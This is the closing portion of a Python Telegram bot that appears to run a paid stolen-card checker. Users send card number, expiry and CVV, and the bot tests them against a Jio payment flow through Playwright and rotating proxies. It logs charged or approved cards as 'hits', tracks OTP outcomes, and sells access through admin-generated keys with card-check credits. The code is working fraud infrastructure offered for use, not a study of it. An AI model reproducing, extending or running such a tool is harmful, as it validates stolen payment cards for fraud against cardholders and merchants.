        await update.message.reply_text(f"💎 **{len(hits)} HITS**\n```\n" + "\n".join(hits[:30]) + "\n```", parse_mode="Markdown")

# ── ADMIN ──
async def cmd_genkey(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    if len(ctx.args) < 3: await update.message.reply_text("⚠️ `/genkey <d> <u> <cc>`", parse_mode="Markdown"); return
    try: d,n,cl = int(ctx.args[0]),int(ctx.args[1]),int(ctx.args[2])
    except: await update.message.reply_text("⚠️ ints"); return
    k = gen_key(d,n,cl,u.id)
    await update.message.reply_text(f"🔑 `{k}`\n▸ {d}d · {n} uses · {cl} CC", parse_mode="Markdown")

async def cmd_ban(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    t = update.message.reply_to_message.from_user.id if update.message.reply_to_message else (int(ctx.args[0]) if ctx.args else None)
    if not t: await update.message.reply_text("⚠️ reply or id"); return
    if is_owner(t): await update.message.reply_text("🚫"); return
    con = db(); cur = con.cursor(); cur.execute("UPDATE users SET banned=1 WHERE user_id=?", (t,)); con.commit(); con.close()
    await update.message.reply_text(f"🚫 `{t}`", parse_mode="Markdown")

async def cmd_unban(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    t = update.message.reply_to_message.from_user.id if update.message.reply_to_message else (int(ctx.args[0]) if ctx.args else None)
    if not t: await update.message.reply_text("⚠️"); return
    con = db(); cur = con.cursor(); cur.execute("UPDATE users SET banned=0 WHERE user_id=?", (t,)); con.commit(); con.close()
    await update.message.reply_text(f"✅ `{t}`", parse_mode="Markdown")

async def cmd_botstats(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    con = db(); cur = con.cursor()
    cur.execute("SELECT total_checks,total_hits,jio_checks,otp_count FROM stats WHERE id=1")
    tc,th,jio,otp = cur.fetchone()
    cur.execute("SELECT COUNT(*) FROM users"); uc = cur.fetchone()[0]
    con.close()
    await update.message.reply_text(
        f"📊 **STATS** 💎\n👥 Users · `{uc}`\n⚡ Total · `{tc}`\n"
        f"💎 Hits · `{th}`\n📱 Jio · `{jio}`\n🔐 OTP · `{otp}`\n"
        f"🤖 Bot · `{bot_days_left()}`d", parse_mode="Markdown")

async def cmd_users(update, ctx):
    u = update.effective_user
    if not is_admin(u.id): await update.message.reply_text("🚫"); return
    con = db(); cur = con.cursor()
    cur.execute("SELECT user_id,username,role FROM users ORDER BY first_seen DESC LIMIT 20")
    rows = cur.fetchall(); con.close()
    out = ["👥 **Users** 💎","━━━━━━━━━━━━━━━━━"]
    for uid, un, rl in rows:
        m = "👑" if rl=="owner" else ("⭐" if rl=="admin" else "👤")
        out.append(f"{m} `{uid}` @{un or '-'}")
    await update.message.reply_text("\n".join(out), parse_mode="Markdown")

# ── CALLBACKS ──
async def on_cb(update, ctx):
    q = update.callback_query; await q.answer()
    d = q.data; uid = q.from_user.id
    ensure_user(uid, q.from_user.username or "")
    if d == "ui_main":
        await q.edit_message_text(f"💎 **{BOT_NAME}**", parse_mode="Markdown", reply_markup=main_kb(uid))
    elif d == "ui_info":
        await q.edit_message_text(user_card(get_user(uid), uid), parse_mode="Markdown", reply_markup=bk())
    elif d == "ui_jio19":
        await q.edit_message_text(jio_text(), parse_mode="Markdown", reply_markup=bk())
    elif d == "ui_chk":
        await q.edit_message_text(chk_text(), parse_mode="Markdown", reply_markup=bk())
    elif d == "ui_help":
        await q.edit_message_text(help_text(), parse_mode="Markdown", reply_markup=bk())
    elif d == "ui_redeem":
        await q.edit_message_text("🔑 `/redeem KEY`", parse_mode="Markdown", reply_markup=bk())
    elif d == "ui_fb":
        await q.edit_message_text("💬 `/feedback msg`", parse_mode="Markdown", reply_markup=bk())
    elif d == "ui_stats":
        con = db(); cur = con.cursor()
        cur.execute("SELECT total_checks,total_hits,jio_checks,otp_count FROM stats WHERE id=1")
        tc,th,jio,otp = cur.fetchone(); con.close()
        u = get_user(uid)
        await q.edit_message_text(
            f"📊 **Stats** 💎\n👤 You · `{u['live_checks'] if u else 0}`\n"
            f"⚡ Total · `{tc}`\n💎 Hits · `{th}`\n📱 Jio · `{jio}`\n🔐 OTP · `{otp}`\n"
            f"🤖 Bot · `{bot_days_left()}`d", parse_mode="Markdown", reply_markup=bk())
    elif d == "ui_admin":
        if uid != OWNER_ID and not is_admin(uid): await q.answer("No", show_alert=True); return
        await q.edit_message_text("👑 **ADMIN** 💎", parse_mode="Markdown", reply_markup=admin_kb())
    elif d == "ad_genkey":
        await q.edit_message_text("🔑 `/genkey 30 10 100`", parse_mode="Markdown", reply_markup=bk("ui_admin"))
    elif d == "ad_stats":
        await q.edit_message_text("📊 Use `/botstats`", parse_mode="Markdown", reply_markup=bk("ui_admin"))
    elif d == "ad_users":
        await q.edit_message_text("👥 Use `/users`", parse_mode="Markdown", reply_markup=bk("ui_admin"))

async def on_msg(update, ctx):
    if not update.message or not update.message.text: return
    if update.message.text.startswith("/"): return
    u = update.effective_user; ensure_user(u.id, u.username or "")
    if is_banned(u.id) or not has_access(u.id): return
    raw = update.message.text.strip(); cp = None
    for sep in ["|","/"," "]:
        p = raw.split(sep)
        if len(p) >= 4: cp = p; break
    if not cp: return
    if not consume_cc(u.id): await update.message.reply_text("💳"); return
    cc,mm,yy,cvv = cp[0],cp[1],cp[2],cp[3]
    masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
    proxy = get_proxy() or "direct"
    pd = proxy.split("@")[-1].split("://")[-1] if proxy else "direct"
    live = LiveLogger(ctx.bot, update.effective_chat.id, masked, pd, max_lines=18)
    await live.log("Starting", "🚀")
    r = await jio19_playwright(cc,mm,yy,cvv, proxy=proxy, log_cb=live.log)
    bump_live(u.id)
    if r["status"] in ("charged","approved"): bump_hit()
    elif r["status"] == "otp": bump_otp()
    elif r["status"] == "error": refund_cc(u.id)
    await live.finish(r["status"], r["response"], r["code"])

# ── BOOT ──
def run_bot():
    app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", cmd_start))
    app_bot.add_handler(CommandHandler("menu", cmd_menu))
    app_bot.add_handler(CommandHandler("help", cmd_help))
    app_bot.add_handler(CommandHandler("myinfo", cmd_myinfo))
    app_bot.add_handler(CommandHandler("redeem", cmd_redeem))
    app_bot.add_handler(CommandHandler("feedback", cmd_feedback))
    app_bot.add_handler(CommandHandler("jio", cmd_jio))
    app_bot.add_handler(CommandHandler("chk", cmd_chk))
    app_bot.add_handler(CommandHandler("genkey", cmd_genkey))
    app_bot.add_handler(CommandHandler("ban", cmd_ban))
    app_bot.add_handler(CommandHandler("unban", cmd_unban))
    app_bot.add_handler(CommandHandler("botstats", cmd_botstats))
    app_bot.add_handler(CommandHandler("users", cmd_users))
    app_bot.add_handler(CallbackQueryHandler(on_cb))
    app_bot.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), on_msg))

    logger.info(f"🚀 {BOT_NAME} Telegram Bot starting...")
    app_bot.run_polling()

def main():
    db_init()
    ensure_user(OWNER_ID, "whoh4rsh")
    con = db(); cur = con.cursor()
    cur.execute("UPDATE users SET role='owner' WHERE user_id=?", (OWNER_ID,))
    con.commit(); con.close()
    logger.info(f"🔍 Browser: {get_browser_path()} | HEADLESS: {HEADLESS} | PORT: {PORT}")
    
    # Telegram Bot running in background thread
    Thread(target=run_bot, daemon=True).start()

    # FastAPI running in main thread for Railway port binding
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")

if __name__ == "__main__":
    main()
